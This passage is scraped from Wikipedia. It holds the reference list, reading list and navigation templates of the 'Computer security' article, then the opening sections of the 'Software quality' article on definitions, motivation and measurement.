International Cybercrime Reporting and Cooperation Act
 at 
Congress.gov




^
 
"Home | Homeland Security & Governmental Affairs Committee"
. 
www.hsgac.senate.gov
. Archived from 
the original
 on 20 January 2012.




^
 
"Biden Adviser On Cyber Threats And The New Executive Order To Combat Them"
. 
NPR
.




^
 
Executive Order on Improving the Nation's Cybersecurity
 (full text)




^
 
"National Cyber Security Division"
. U.S. Department of Homeland Security. Archived from 
the original
 on 11 June 2008
. Retrieved 
14 June
 2008
.




^ 
a
 
b
 
"FAQ: Cyber Security R&D Center"
. U.S. Department of Homeland Security S&T Directorate. 
Archived
 from the original on 6 October 2008
. Retrieved 
14 June
 2008
.




^
 
AFP-JiJi, "U.S. boots up cybersecurity center", 31 October 2009.




^
 
"Federal Bureau of Investigation – Priorities"
. Federal Bureau of Investigation. 
Archived
 from the original on 11 July 2016.




^
 
"Internet Crime Complaint Center (IC3) – Home"
. 
Archived
 from the original on 20 November 2011.




^
 
"Infragard, Official Site"
. 
Infragard
. 
Archived
 from the original on 9 September 2010
. Retrieved 
10 September
 2010
.




^
 
"Robert S. Mueller, III – InfraGard Interview at the 2005 InfraGard Conference"
. 
Infragard (Official Site) – "Media Room"
. Archived from 
the original
 on 17 June 2011
. Retrieved 
9 December
 2009
.




^
 
"CCIPS"
. 25 March 2015. 
Archived
 from the original on 23 August 2006.




^
 
"A Framework for a Vulnerability Disclosure Program for Online Systems"
. Cybersecurity Unit, Computer Crime & Intellectual Property Section Criminal Division U.S. Department of Justice. July 2017
. Retrieved 
9 July
 2018
.




^
 
"Mission and Vision"
. 
www.cybercom.mil
. Retrieved 
20 June
 2020
.




^
 
William J. Lynn, III (12 November 2009). 
Remarks at the Defense Information Technology Acquisition Summit
 (Speech). Washington D.C. Archived from 
the original
 on 15 April 2010
. Retrieved 
10 July
 2010
.




^
 
Shachtman, Noah (23 September 2010). 
"Military's Cyber Commander Swears: "No Role" in Civilian Networks"
. 
brookings.edu
. Archived from 
the original
 on 6 November 2010.




^
 
"FCC Cybersecurity"
. FCC. Archived from 
the original
 on 27 May 2010
. Retrieved 
3 December
 2014
.




^
 
"Cybersecurity for Medical Devices and Hospital Networks: FDA Safety Communication"
. 
Food and Drug Administration
. 
Archived
 from the original on 28 May 2016
. Retrieved 
23 May
 2016
.




^
 
"Automotive Cybersecurity – National Highway Traffic Safety Administration (NHTSA)"
. Archived from 
the original
 on 25 May 2016
. Retrieved 
23 May
 2016
.




^
 
Air Traffic Control: FAA Needs a More Comprehensive Approach to Address Cybersecurity As Agency Transitions to NextGen
 (Report). U. S. Government Accountability Office. 14 April 2015. 
Archived
 from the original on 13 June 2016
. Retrieved 
23 May
 2016
.




^
 
Aliya Sternstein (4 March 2016). 
"FAA Working on New Guidelines for Hack-Proof Planes"
. 
Nextgov
. 
Archived
 from the original on 19 May 2016
. Retrieved 
23 May
 2016
.




^
 
Bart Elias (18 June 2015). 
"Protecting Civil Aviation from Cyberattacks"
 
(PDF)
. 
Archived
 
(PDF)
 from the original on 17 October 2016
. Retrieved 
4 November
 2016
.




^
 
Anderson, David; Reimers, Karl (2019). 
CYBER SECURITY EMPLOYMENT POLICY AND WORKPLACE DEMAND IN THE U.S. GOVERNMENT
. EDULEARN19 Proceedings. Vol. 1. IATED. pp. 7858–7866. 
doi
:
10.21125/edulearn.2019.1914
. 
ISBN
 
978-84-09-12031-4
. 
ISSN
 
2340-1117
.




^
 
Verton, Dan (28 January 2004). 
"DHS launches national cyber alert system"
. 
Computerworld
. IDG. 
Archived
 from the original on 31 August 2005
. Retrieved 
15 June
 2008
.




^
 
Details can be found in 
10 CFR 73.54, Protection of digital computer and communication systems and networks
.




^
 
Cyber Security Plan for Nuclear Power Reactors
 - Nuclear Energy Institute




^
 
Refer to 
NEI 08-09
 for more details.




^
 
Clayton, Mark (7 March 2011). 
"The new cyber arms race"
. 
The Christian Science Monitor
. 
Archived
 from the original on 16 April 2015
. Retrieved 
16 April
 2015
.




^
 
Nakashima, Ellen (13 September 2016). 
"Obama to be urged to split cyberwar command from NSA"
. 
The Washington Post
. Archived from 
the original
 on 12 October 2016
. Retrieved 
15 June
 2017
.




^
 
Overland, Indra (1 March 2019). 
"The geopolitics of renewable energy: Debunking four emerging myths"
. 
Energy Research & Social Science
. 
49
: 36–40. 
Bibcode
:
2019ERSS...49...36O
. 
doi
:
10.1016/j.erss.2018.10.018
. 
hdl
:
11250/2579292
. 
ISSN
 
2214-6296
.




^
 
Maness, Ryan C.; Valeriano, Brandon (11 June 2018). 
"How We Stopped Worrying about Cyber Doom and Started Collecting Data"
. 
Politics and Governance
. 
6
 (2): 49–60. 
doi
:
10.17645/pag.v6i2.1368
. 
hdl
:
10945/60589
. 
ISSN
 
2183-2463
.




^
 
Maness, Ryan C.; Valeriano, Brandon (25 March 2015). "The Impact of Cyber Conflict on International Interactions". 
Armed Forces & Society
. 
42
 (2): 301–323. 
doi
:
10.1177/0095327x15572997
. 
ISSN
 
0095-327X
. 
S2CID
 
146145942
.




^
 
Bullard, Brittany (2016). 
Style and Statistics: The Art of Retail Analytics
. Wiley. 
doi
:
10.1002/9781119271260.ch8
. 
ISBN
 
978-1119270317
.




^
 
Oltsik, Jon (18 March 2016). 
"Cybersecurity Skills Shortage Impact on Cloud Computing"
. 
Network World
. Archived from 
the original
 on 23 March 2016
. Retrieved 
23 March
 2016
.




^
 
Robinson, Terry (30 May 2018). 
"Why is a Degree in Cyber Security one of the Best?"
. 
DegreeQuery.com
. Archived from 
the original
 on 10 October 2021
. Retrieved 
10 October
 2021
.




^
 
de Silva, Richard (11 October 2011). 
"Government vs. Commerce: The Cyber Security Industry and You (Part One)"
. Defence IQ. 
Archived
 from the original on 24 April 2014
. Retrieved 
24 April
 2014
.




^
 
"Department of Computer Science"
. Archived from 
the original
 on 3 June 2013
. Retrieved 
30 April
 2013
.




^
 
"About Cyber Security architect"
. 
cisa.gov
. 1 August 2021
. Retrieved 
1 January
 2022
.




^
 
"How to become a Chief Information Security Officer (CISO)?"
. 
cybersecuritycareer.org
. 1 August 2021
. Retrieved 
4 January
 2022
.




^
 
"Data Protection Officers"
. 
ico.org.uk
. January 2021.




^
 
"Student Cybersecurity Resources"
. NICCS (US National Initiative for Cybercareers and Studies). 
Archived
 from the original on 5 November 2020.




^
 
"Current Job Opportunities at DHS"
. U.S. Department of Homeland Security. 
Archived
 from the original on 2 May 2013
. Retrieved 
5 May
 2013
.




^
 
"Cybersecurity Training & Exercises"
. U.S. Department of Homeland Security. 12 May 2010. 
Archived
 from the original on 7 January 2015
. Retrieved 
9 January
 2015
.




^
 
"Cyber Security Awareness Free Training and Webcasts"
. MS-ISAC (Multi-State Information Sharing & Analysis Center). 
Archived
 from the original on 6 January 2015
. Retrieved 
9 January
 2015
.




^
 
"DoD Approved 8570 Baseline Certifications"
. 
iase.disa.mil
. Archived from 
the original
 on 21 October 2016
. Retrieved 
19 June
 2017
.




^
 
"The UK Cyber Security Strategy: Report on Progress and Forward Plans December 2014"
 
(PDF)
. United Kingdom Cabinet Office. 
Archived
 
(PDF)
 from the original on 18 April 2018
. Retrieved 
20 August
 2021
.




^
 
"Cyber skills for a vibrant and secure UK"
. 
GOV.UK
.




^
 
"Singapore Operational Technology (OT) Cybersecurity Competency Framework"
. 
Cyber Security Agency
 (Press release). 8 October 2021. Archived from 
the original
 on 16 October 2021
. Retrieved 
23 October
 2021
.




^
 
"Confidentiality"
. Retrieved 
31 October
 2011
.




^
 
"Data Integrity"
. 
Archived
 from the original on 6 November 2011
. Retrieved 
31 October
 2011
.




^
 
"Endpoint Security"
. 10 November 2010. 
Archived
 from the original on 16 March 2014
. Retrieved 
15 March
 2014
.




^
 
"A Brief History of the Cybersecurity Profession"
. 
ISACA
. Retrieved 
13 October
 2023
.




^
 
"One step ahead in computing security"
. 
RIT
. Retrieved 
13 October
 2023
.




^ 
a
 
b
 
Misa, Thomas J. (2016). 
"Computer Security Discourse at RAND, SDC, and NSA (1958-1970)"
. 
IEEE Annals of the History of Computing
. 
38
 (4): 12–25. 
doi
:
10.1109/MAHC.2016.48
. 
S2CID
 
17609542
.




^
 
A. J. Neumann, N. Statland and R. D. Webb (1977). 
"Post-processing audit tools and techniques"
 
(PDF)
. 
nist.gov
. US Department of Commerce, National Bureau of Standards. pp. 11–3–11–4. 
Archived
 
(PDF)
 from the original on 10 October 2016
. Retrieved 
19 June
 2020
.




^
 
Irwin, Luke (5 April 2018). 
"How NIST can protect the CIA triad, including the often overlooked 'I' – integrity"
. 
www.itgovernanceusa.com
. Retrieved 
16 January
 2021
.




^
 
Perrin, Chad (30 June 2008). 
"The CIA Triad"
. 
techrepublic.com
. Retrieved 
31 May
 2012
.




^
 
Stoneburner, G.; Hayden, C.; Feringa, A. (2004). 
Engineering Principles for Information Technology Security
 
(PDF)
 (Report). csrc.nist.gov. 
doi
:
10.6028/NIST.SP.800-27rA
. 
Archived
 
(PDF)
 from the original on 12 October 2004.
 
Note: this document has been superseded by later versions.




^
 
Yost, Jeffrey R. (April 2015). 
"The Origin and Early History of the Computer Security Software Products Industry"
. 
IEEE Annals of the History of Computing
. 
37
 (2): 46–58. 
doi
:
10.1109/MAHC.2015.21
. 
ISSN
 
1934-1547
. 
S2CID
 
18929482
.




^
 
"A Brief History of Computer Viruses & What the Future Holds"
. 
www.kaspersky.com
. 19 April 2023
. Retrieved 
12 June
 2024
.




^
 
"First incident of cyber-espionage"
. 
Guinness World Records
. Retrieved 
23 January
 2024
.




^
 
FBI News (2 November 2018). 
"The Morris Worm - 30 Years Since First Major Attack on the Internet"
. 
fbi.gov
. Retrieved 
23 January
 2024
.




^
 
"1993: Mosaic Launches and the Web is Set Free"
. 
Web Development History
. 8 December 2021.




^
 
"Web Design Museum - Netscape Navigator 2.0"
. 10 March 2023
. Retrieved 
4 December
 2023
.




^
 
Nakashima, Ellen (26 January 2008). 
"Bush Order Expands Network Monitoring: Intelligence Agencies to Track Intrusions"
. 
The Washington Post
. Retrieved 
8 February
 2021
.




^ 
a
 
b
 
Nicole Perlroth (7 February 2021). 
"How the U.S. Lost to Hackers"
. 
The New York Times
. Archived from 
the original
 on 28 December 2021
. Retrieved 
9 February
 2021
.






Further reading
[
edit
]






Library resources
 about 
 
Computer security
 




Resources in your library


Resources in other libraries






Branch, Jordan (24 September 2020). "What's in a Name? Metaphors and Cybersecurity". 
International Organization
. 
75
 (1). Cambridge University Press (CUP): 39–70. 
doi
:
10.1017/s002081832000051x
. 
ISSN
 
0020-8183
. 
S2CID
 
224886794
.


Costigan, Sean; Hennessy, Michael (2016). 
Cybersecurity: A Generic Reference Curriculum
 
(PDF)
. NATO. 
ISBN
 
978-9284501960
. 
Archived
 
(PDF)
 from the original on 10 March 2017.


Fuller, Christopher J (11 June 2018). 
"The Roots of the United States' Cyber (In)Security"
 
(DOC)
. 
Diplomatic History
. 
43
 (1). Oxford University Press (OUP): 157–185. 
doi
:
10.1093/dh/dhy038
. 
ISSN
 
0145-2096
.


Bob, Yonah Jeremy (21 August 2021). 
"Ex-IDF cyber intel. official reveals secrets behind cyber offense"
. 
The Jerusalem Post
.


Kim, Peter (2014). 
The Hacker Playbook: Practical Guide To Penetration Testing
. Seattle: 
CreateSpace Independent Publishing Platform
. 
ISBN
 
978-1494932633
.


Lee, Newton
 (2015). 
Counterterrorism and Cybersecurity: Total Information Awareness
 (2nd ed.). Springer. 
ISBN
 
978-3319172439
.


Montagnani, Maria Lillà; Cavallo, Mirta Antonella (2018). 
"Cybersecurity and Liability in a Big Data World"
. 
Market and Competition Law Review
. 
2
 (2). Elsevier BV: 71–98. 
doi
:
10.2139/ssrn.3220475
. 
ISSN
 
1556-5068
. 
S2CID
 
216704215
. 
SSRN
 
3220475
.


Shariati, Marzieh; Bahmani, Faezeh; Shams, Fereidoon (2011). 
"Enterprise information security, a review of architectures and frameworks from interoperability perspective"
. 
Procedia Computer Science
. 
3
. Elsevier BV: 537–543. 
doi
:
10.1016/j.procs.2010.12.089
. 
ISSN
 
1877-0509
.


Singer, P. W.; Friedman, Allan (2014). 
Cybersecurity and Cyberwar: What Everyone Needs to Know
. Oxford University Press. 
ISBN
 
978-0199918119
.


Wu, Chwan-Hwa (John); Irwin, J. David (2013). 
Introduction to Computer Networks and Cybersecurity
. Boca Raton: CRC Press. 
ISBN
 
978-1466572133
.


Cybersecurity Best Practices | Cybersecurity and Infrastructure Security Agency CISA. (n.d.). Retrieved April 24, 2024, from 
https://www.cisa.gov/topics/cybersecurity-best-practices


Sztyber-Betley, A., Syfert, M., Kościelny, J. M., & Górecka, Z. (2023). Controller Cyber-Attack Detection and Isolation †: Sensors (14248220). Sensors (14248220), 23(5), 2778. 
doi
:
10.3390/s23052778








Wikimedia Commons has media related to 
Computer security
.




v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation




v
t
e
Computer science
Note: This template roughly follows the 2012 
ACM Computing Classification System
.
Hardware


Printed circuit board


Peripheral


Integrated circuit


Very Large Scale Integration


Systems on Chip (SoCs)


Energy consumption (Green computing)


Electronic design automation


Hardware acceleration


Processor


Size
 / 
Form


Computer systems organization


Computer architecture


Computational complexity


Dependability


Embedded system


Real-time computing


Networks


Network architecture


Network protocol


Network components


Network scheduler


Network performance evaluation


Network service


Software organization


Interpreter


Middleware


Virtual machine


Operating system


Software quality


Software notations
 and 
tools


Programming paradigm


Programming language


Compiler


Domain-specific language


Modeling language


Software framework


Integrated development environment


Software configuration management


Software library


Software repository


Software development


Control variable


Software development process


Requirements analysis


Software design


Software construction


Software deployment


Software engineering


Software maintenance


Programming team


Open-source model


Theory of computation


Model of computation


Formal language


Automata theory


Computability theory


Computational complexity theory


Logic


Semantics


Algorithms


Algorithm design


Analysis of algorithms


Algorithmic efficiency


Randomized algorithm


Computational geometry


Mathematics of 
computing


Discrete mathematics


Probability


Statistics


Mathematical software


Information theory


Mathematical analysis


Numerical analysis


Theoretical computer science


Information systems


Database management system


Information storage systems


Enterprise information system


Social information systems


Geographic information system


Decision support system


Process control system


Multimedia information system


Data mining


Digital library


Computing platform


Digital marketing


World Wide Web


Information retrieval


Security


Cryptography


Formal methods


Security hacker


Security services


Intrusion detection system


Hardware security


Network security


Information security


Application security


Human–computer interaction


Interaction design


Social computing


Ubiquitous computing


Visualization


Accessibility


Concurrency


Concurrent computing


Parallel computing


Distributed computing


Multithreading


Multiprocessing


Artificial intelligence


Natural language processing


Knowledge representation and reasoning


Computer vision


Automated planning and scheduling


Search methodology


Control method


Philosophy of artificial intelligence


Distributed artificial intelligence


Machine learning


Supervised learning


Unsupervised learning


Reinforcement learning


Multi-task learning


Cross-validation


Graphics


Animation


Rendering


Photograph manipulation


Graphics processing unit


Mixed reality


Virtual reality


Image compression


Solid modeling


Applied computing


Quantum Computing


E-commerce


Enterprise software


Computational mathematics


Computational physics


Computational chemistry


Computational biology


Computational social science


Computational engineering


Differentiable computing


Computational healthcare


Digital art


Electronic publishing


Cyberwarfare


Electronic voting


Video games


Word processing


Operations research


Educational technology


Document management




 
Category


 
Outline


 
Glossaries




Authority control databases
: National 
Germany
United States
France
BnF data
Czech Republic
2
Poland
Israel










Retrieved from "
https://en.wikipedia.org/w/index.php?title=Computer_security&oldid=1244466458
"


Categories
: 
Computer security
Cryptography
Cyberwarfare
Data protection
Information governance
Malware
Hidden categories: 
Articles with Encyclopædia Britannica links
CS1: long volume value
Webarchive template wayback links
Articles with short description
Short description is different from Wikidata
Use American English from August 2024
All Wikipedia articles written in American English
Use dmy dates from February 2021
All articles with specifically marked weasel-worded phrases
Articles with specifically marked weasel-worded phrases from December 2012
All articles with vague or ambiguous time
Vague or ambiguous time from September 2021
All articles with unsourced statements
Articles with unsourced statements from April 2020
Pages displaying short descriptions of redirect targets via Module:Annotated link
Pages displaying wikidata descriptions as a fallback via Module:Annotated link
Commons category link from Wikidata
Articles prone to spam from November 2014











From Wikipedia, the free encyclopedia






Refers to two related but distinct notions: functional quality and structural quality


This article 
needs additional citations for 
verification
.
 Please help 
improve this article
 by 
adding citations to reliable sources
. Unsourced material may be challenged and removed.
Find sources:
 
"Software quality"
 – 
news
 
·
 
newspapers
 
·
 
books
 
·
 
scholar
 
·
 
JSTOR
 
(
December 2021
)
 (
Learn how and when to remove this message
)


In the context of 
software engineering
, 
software quality
 refers to two related but distinct notions:
[
citation needed
]




Software's functional quality reflects how well it complies with or conforms to a given design, based on 
functional requirements
 or specifications.
[
1
]
 That attribute can also be described as the fitness for the purpose of a piece of software or how it compares to competitors in the marketplace as a worthwhile 
product
.
[
2
]
 It is the degree to which the 
correct
 software was produced.


Software structural quality refers to how it meets 
non-functional requirements
 that support the delivery of the functional requirements, such as robustness or maintainability. It has a lot more to do with the degree to which the software works as 
needed
.


Many aspects of structural quality can be evaluated only 
statically
 through the analysis of the software's inner structure, its source code (see 
Software metrics
),
[
3
]
 at the unit level, and at the system level (sometimes referred to as end-to-end testing
[
4
]
), which is in effect how its architecture adheres to sound principles of 
software architecture
 outlined in a paper on the topic by 
Object Management Group
 (OMG).
[
5
]


Some structural qualities, such as 
usability
, can be 
assessed
 only 
dynamically
 (users or others acting on their behalf interact with the software or, at least, some prototype or partial implementation; even the interaction with a mock version made in cardboard represents a dynamic test because such version can be considered a prototype). Other aspects, such as reliability, might involve not only the software but also the underlying hardware, therefore, it can be assessed both statically and dynamically (
stress test
).
[
citation needed
]


Using 
automated tests
 and 
fitness functions
 can help to maintain some of the quality related attributes. 
[
6
]


Functional quality is typically assessed dynamically but it is also possible to use static tests (such as 
software reviews
).
[
citation needed
]


Historically, the structure, classification, and terminology of attributes and metrics applicable to 
software quality management
 have been derived or extracted from the 
ISO 9126
 and the subsequent 
ISO/IEC 25000
 standard.
[
7
]
 Based on these models (see Models), the 
Consortium for IT Software Quality
 (CISQ) has defined five major desirable structural characteristics needed for a piece of software to provide 
business value
:
[
8
]
 Reliability, Efficiency, Security, Maintainability, and (adequate) Size.
[
9
]
[
10
]
[
11
]


Software quality measurement quantifies to what extent a software program or system rates along each of these five dimensions. An aggregated measure of software quality can be computed through a qualitative or a quantitative scoring scheme or a mix of both and then a weighting system reflecting the priorities. This view of software quality being positioned on a linear continuum is supplemented by the analysis of "critical programming errors" that under specific circumstances can lead to catastrophic outages or performance degradations that make a given system unsuitable for use regardless of rating based on aggregated measurements. Such programming errors found at the system level represent up to 90 percent of production issues, whilst at the unit-level, even if far more numerous, programming errors account for less than 10 percent of production issues (see also 
Ninety–ninety rule
). As a consequence, code quality without the context of the whole system, as 
W. Edwards Deming
 described it, has limited value.
[
citation needed
]


To view, explore, analyze, and communicate software quality measurements, concepts and techniques of 
information visualization
 provide visual, interactive means useful, in particular, if several software quality measures have to be related to each other or to components of a software or system. For example, 
software maps
 represent a specialized approach that "can express and combine information about software development, software quality, and system dynamics".
[
12
]


Software quality also plays a role in the release phase of a software project. Specifically, the quality and establishment of the 
release processes
 (also 
patch processes
),
[
13
]
[
14
]
 
configuration management
[
15
]
 are important parts of an overall software engineering process.
[
16
]
[
17
]
[
18
]






Motivation
[
edit
]


Software quality is motivated by at least two main perspectives:



Risk management
: Software failure has caused more than inconvenience. Software errors can cause human fatalities (see for example: 
List of software bugs
). The causes have ranged from poorly designed user interfaces to direct 
programming errors
,
[
19
]
[
20
]
[
21
]
 see for example 
Boeing 737 case
 or 
Unintended acceleration
 cases
[
22
]
[
23
]
 or 
Therac-25
 cases.
[
24
]
 This resulted in requirements for the development of some types of software, particularly and historically for 
software embedded
 in medical and other devices that regulate critical infrastructures: "[Engineers who write embedded software] see Java programs stalling for one third of a second to perform garbage collection and update the user interface, and they envision airplanes falling out of the sky.".
[
25
]
 In the United States, within the 
Federal Aviation Administration
 (FAA), the FAA Aircraft Certification Service provides software programs, policy, guidance and training, focus on software and Complex Electronic Hardware that has an effect on the airborne product (a "product" is an aircraft, an engine, or a propeller).
[
26
]
 Certification standards such as 
DO-178C
, 
ISO 26262
, 
IEC 62304
, etc. provide guidance.


Cost management
: As in any other fields of engineering, a software product or service governed by good software quality costs less to maintain, is easier to understand and can change more cost-effective in response to pressing business needs.
[
27
]
 Industry data demonstrate that poor application structural quality in core 
business applications
 (such as 
enterprise resource planning
 (ERP), 
customer relationship management
 (CRM) or large 
transaction processing
 systems in financial services) results in cost, schedule overruns and creates waste in the form of rework (see 
Muda (Japanese term)
).
[
28
]
[
29
]
[
30
]
 Moreover, poor structural quality is strongly correlated with high-impact business disruptions due to corrupted data, application outages, security breaches, and performance problems.
[
31
]


CISQ reports on the cost of poor quality estimates an impact of:

$2.08 trillion in 2020
[
32
]
[
33
]


$2.84 trillion in 2018


IBM's Cost of a Data Breach Report 2020 estimates that the average global costs of a data breach:
[
34
]
[
35
]


$3.86 million


Definitions
[
edit
]


ISO
[
edit
]


Software quality is the "capability of a software product to conform to requirements."
[
36
]
[
37
]
 while for others it can be synonymous with customer- or value-creation
[
38
]
[
39
]
 or even defect level.
[
40
]
 Software quality measurements can be split into three parts: process quality, product quality which includes internal and external properties and lastly, quality in use, which is the effect of the software.
[
41
]




ASQ
[
edit
]


ASQ
 uses the following definition: 
Software quality
 describes the desirable attributes of software products. There are two main approaches exist: defect management and quality attributes.
[
42
]




NIST
[
edit
]


Software Assurance (SA) covers both the property and the process to achieve it:
[
43
]




[Justifiable] confidence that software is free from vulnerabilities, either intentionally designed into the software or accidentally inserted at any time during its life cycle and that the software functions in the intended manner


The planned and systematic set of activities that ensure that software life cycle processes and products conform to requirements, standards, and procedures


PMI
[
edit
]


The 
Project Management Institute
's 
PMBOK
 Guide "Software Extension" defines not 
"Software quality"
 itself, but Software Quality Assurance (SQA) as 
"a continuous process that audits other software processes to ensure that those processes are being followed (includes for example a software quality management plan)."
 whereas Software Quality Control (SCQ) means 
"taking care of applying methods, tools, techniques to ensure satisfaction of the work products toward quality requirements for a software under development or modification."
[
44
]




Other general and historic
[
edit
]


The first definition of quality history remembers is from Shewhart in the beginning of 20th century: 
"There are two common aspects of quality: one of them has to do with the consideration of the quality of a thing as an objective reality independent of the existence of man. The other has to do with what we think, feel or sense as a result of the objective reality. In other words, there is a subjective side of quality."
[
45
]


Kitchenham
 and Pfleeger, further reporting the teachings of David Garvin, identify five different perspectives on quality:
[
46
]
[
47
]




The transcendental perspective deals with the metaphysical aspect of quality. In this view of quality, it is "something toward which we strive as an ideal, but may never implement completely".
[
48
]
 It can hardly be defined, but is similar to what a federal judge once commented about obscenity: "I know it when I see it".
[
49
]


The user perspective is concerned with the appropriateness of the product for a given context of use. Whereas the transcendental view is ethereal, the user view is more concrete, grounded in the product characteristics that meet user's needs.
[
48
]


The manufacturing perspective represents quality as conformance to requirements. This aspect of quality is stressed by standards such as ISO 9001, which defines quality as "the degree to which a set of inherent characteristics fulfills requirements" (ISO/IEC 9001
[
50
]
).


The product perspective implies that quality can be appreciated by measuring the inherent characteristics of the product.


The final perspective of quality is value-based.
[
38
]
 This perspective recognizes that the different perspectives of quality may have different importance, or value, to various stakeholders.


The problem inherent in attempts to define the quality of a product, almost any product, was stated by the master Walter A. Shewhart. The difficulty in defining quality is to translate the future needs of the user into measurable characteristics, so that a product can be designed and turned out to give satisfaction at a price that the user will pay. This is not easy, and as soon as one feels fairly successful in the endeavor, he finds that the needs of the consumer have changed, competitors have moved in, etc.
[
51
]
— 
W. Edwards Deming


Quality is a customer determination, not an engineer's determination, not a marketing determination, nor a general management determination. It is based on the customer's actual experience with the product or service, measured against his or her requirements -- stated or unstated, conscious or merely sensed, technically operational or entirely subjective -- and always representing a moving target in a competitive market.
[
52
]


The word quality has multiple meanings. Two of these meanings dominate the use of the word: 1. Quality consists of those product features which meet the need of customers and thereby provide product satisfaction. 2. Quality consists of freedom from deficiencies. Nevertheless, in a handbook such as this it is convenient to standardize on a short definition of the word quality as "fitness for use".
[
53
]


Tom DeMarco
 has proposed that "a product's quality is a function of how much it changes the world for the better."
[
citation needed
]
 This can be interpreted as meaning that functional quality and user satisfaction are more important than structural quality in determining software quality.

Another definition, coined by 
Gerald Weinberg
 in Quality Software Management: Systems Thinking, is "Quality is value to some person."
[
54
]
[
55
]




Other meanings and controversies
[
edit
]


One of the challenges in defining quality is that "everyone feels they understand it"
[
56
]
 and other 
definitions of software quality
 could be based on extending the various descriptions of the concept of quality used in business.

Software quality also often gets mixed-up with 
Quality Assurance
 or Problem Resolution Management
[
57
]
 or 
Quality Control
[
58
]
  or 
DevOps
. It does over-lap with before mentioned areas (see also PMI definitions), but is distinctive as it does not solely focus on testing but also on processes, management, improvements, assessments, etc.
[
58
]






Measurement
[
edit
]


Although the concepts presented in this section are applicable to both structural and functional software quality, measurement of the latter is essentially performed through 
software testing
.
[
59
]
 Testing is not enough: According to one study, "individual programmers are less than 50% efficient at finding bugs in their own software. And most forms of testing are only 35% efficient. This makes it difficult to determine [software] quality."
[
60
]




Introduction
[
edit
]


Relationship between software desirable characteristics (right) and measurable attributes (left)


Software quality measurement is about quantifying to what extent a system or software possesses desirable characteristics. This can be performed through qualitative or quantitative means or a mix of both. In both cases, for each desirable characteristic, there are a set of measurable attributes the existence of which in a piece of software or system tend to be correlated and associated with this characteristic. For example, an attribute associated with portability is the number of target-dependent statements in a program. More precisely, using the 
Quality Function Deployment
 approach, these measurable attributes are the "hows" that need to be enforced to enable the "whats" in the Software Quality definition above.

The structure, classification and terminology of attributes and metrics applicable to software quality management have been derived or extracted from the 
ISO 9126-3
 and the subsequent ISO/IEC 25000:2005 quality model. The main focus is on internal structural quality. Subcategories have been created to handle specific areas like business application architecture and technical characteristics such as data access and manipulation or the notion of transactions.

The dependence tree between software quality characteristics and their measurable attributes is represented in the diagram on the right, where each of the 5 characteristics that matter for the user (right) or owner of the business system depends on measurable attributes (left):



Application Architecture Practices


Coding Practices


Application Complexity


Documentation


Portability


Technical and Functional Volume


Correlations between programming errors and production defects unveil that basic code errors account for 92 percent of the total errors in the source code. These numerous code-level issues eventually count for only 10 percent of the defects in production. Bad software engineering practices at the architecture levels account for only 8 percent of total defects, but consume over half the effort spent on fixing problems, and lead to 90 percent of the serious reliability, security, and efficiency issues in production.
[
61
]
[
62
]




Code-based analysis
[
edit
]


Many of the existing software measures count structural elements of the application that result from parsing the source code for such individual instructions
[
63
]
 tokens
[
64
]
 control structures (
Complexity
), and objects.
[
65
]


Software quality measurement is about quantifying to what extent a system or software rates along these dimensions. The analysis can be performed using a qualitative or quantitative approach or a mix of both to provide an aggregate view [using for example weighted average(s) that reflect relative importance between the factors being measured].

This view of software quality on a linear continuum has to be supplemented by the identification of discrete 
Critical Programming Errors
. These vulnerabilities may not fail a test case, but they are the result of bad practices that under specific circumstances can lead to catastrophic outages, performance degradations, security breaches, corrupted data, and myriad other problems
[
66
]
 that make a given system de facto unsuitable for use regardless of its rating based on aggregated measurements. A well-known example of vulnerability is the 
Common Weakness Enumeration
,
[
67
]
 a repository of vulnerabilities in the source code that make applications exposed to security breaches.

The measurement of critical application characteristics involves measuring structural attributes of the application's architecture, coding, and in-line documentation, as displayed in the picture above. Thus, each characteristic is affected by attributes at numerous levels of abstraction in the application and all of which must be included in calculating the characteristic's measure if it is to be a valuable predictor of quality outcomes that affect the business. The layered approach to calculating characteristic measures displayed in the figure above was first proposed by Boehm and his colleagues at TRW (Boehm, 1978)
[
68
]
 and is the approach taken in the ISO 9126 and 25000 series standards. These attributes can be measured from the parsed results of a static analysis of the application source code. Even dynamic characteristics of applications such as reliability and performance efficiency have their causal roots in the static structure of the application.

Structural quality analysis and measurement is performed through the analysis of the 
source code
, the 
architecture
, 
software framework
, 
database schema
 in relationship to principles and standards that together define the conceptual and logical architecture of a system. This is distinct from the basic, local, component-level code analysis typically performed by 
development tools
 which are mostly concerned with implementation considerations and are crucial during 
debugging
 and 
testing
 activities.



Reliability
[
edit
]


The root causes of poor reliability are found in a combination of non-compliance with good architectural and coding practices. This non-compliance can be detected by measuring the static quality attributes of an application. Assessing the static attributes underlying an application's reliability provides an estimate of the level of business risk and the likelihood of potential application failures and defects the application will experience when placed in operation.

Assessing reliability requires checks of at least the following software engineering best practices and technical attributes:





Application Architecture Practices


Coding Practices


Complexity of algorithms


Complexity of programming practices


Compliance with Object-Oriented and Structured Programming best practices (when applicable)


Component or pattern re-use ratio


Dirty programming


Error & Exception handling (for all layers - GUI, Logic & Data)


Multi-layer design compliance


Resource bounds management


Software avoids patterns that will lead to unexpected behaviors


Software manages data integrity and consistency


Transaction complexity level




